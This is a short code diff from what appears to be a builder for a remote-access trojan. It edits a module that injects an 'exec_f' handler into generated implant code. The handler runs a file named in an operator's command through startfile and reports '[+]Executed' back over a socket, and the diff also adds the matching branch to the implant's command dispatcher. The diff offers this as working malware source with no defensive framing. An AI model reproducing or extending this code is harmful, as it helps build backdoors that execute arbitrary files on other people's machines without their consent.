@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -13,8 +12,7 @@ def main(option):
         config.functions.append('''
 def exec_f(file):
     startfile(file.split(' ',1)[1])
-    s.sendall(().encode())
-    main_send('[+]Executed : ' + file.split(' ',1)[1], s)''')
+    send_all(s,'[+]Executed : ' + file.split(' ',1)[1])''')
         config.logics.append('''
             elif command == "exec_f":
                 exec_f(data)''')
